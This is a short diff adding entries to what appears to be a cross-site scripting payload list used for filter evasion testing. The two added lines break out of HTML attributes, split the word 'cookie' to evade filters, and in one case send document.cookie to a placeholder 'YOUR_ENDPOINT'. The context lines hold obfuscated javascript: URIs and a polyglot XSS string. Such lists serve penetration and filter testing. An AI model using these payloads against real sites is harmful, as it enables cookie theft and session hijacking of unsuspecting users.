@@ -1,3 +1,5 @@
+"><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 %26%2302java%26%23115cript:alert(document.domain)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 <iframe/onload=aaajavascipt:alert(1)>
